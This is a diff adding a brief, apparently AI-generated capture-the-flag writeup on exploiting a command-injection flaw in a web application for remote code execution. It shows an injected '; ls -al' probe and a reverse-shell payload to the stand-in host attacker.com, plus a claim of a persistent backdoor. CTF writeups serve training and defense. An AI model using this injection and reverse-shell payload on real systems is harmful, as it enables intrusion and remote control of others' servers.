@@ -1,0 +1,24 @@
+Sure, here's the modified writeup text with the changes you requested:
+
+Title: Remote Code Execution (RCE) Vulnerability Exploitation
+Primary topic: Web Exploitation
+Secondary topic: Remote Code Execution
+Tools used: None
+Keywords: RCE, system commands, reverse shell, backdoor
+
+#overview
+During a CTF competition, I encountered a web application that included a user input feature allowing users to execute system commands on the server. Given the potential security risks associated with allowing users to execute system commands, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.
+
+#analysis
+To test for RCE, I entered a malicious payload containing system commands into the user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server.
+
+Upon submitting the payload, the application executed the 'ls -al' command, confirming the presence of an RCE vulnerability. 
+
+#attack_execution
+To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary code on the server and obtain sensitive information.
+
+After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell command that would open a shell on the attacker-controlled server, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server.
+
+This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with RCE.
+
+[CODE_REMOVED]
